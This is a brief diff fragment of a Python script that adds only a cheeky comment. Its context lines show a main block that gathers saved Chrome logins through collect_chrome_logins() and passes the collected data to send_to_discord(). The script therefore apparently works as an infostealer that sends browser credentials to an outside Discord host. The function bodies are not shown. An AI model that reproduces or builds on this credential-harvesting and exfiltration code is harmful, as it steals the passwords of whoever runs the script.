@@ -156,3 +156,4 @@ if __name__ == "__main__":
         "chrome_logins": collect_chrome_logins()
     }
     send_to_discord(all_data)
+#THANK FOR INSPECTING MY PROJECT ;)
